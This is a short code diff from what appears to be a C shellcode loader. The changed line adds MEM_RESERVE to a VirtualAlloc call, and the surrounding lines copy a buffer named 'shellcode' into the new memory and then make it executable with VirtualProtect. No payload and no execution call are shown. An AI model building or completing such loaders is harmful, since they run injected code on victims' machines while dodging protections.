@@ -61,7 +61,7 @@ int main(int argc, char *argv[]) {
     }
 
 
-    void *exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
+    void *exec = VirtualAlloc(0, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
     memcpy(exec, shellcode, memory_allocation);
     DWORD ignore;
     VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
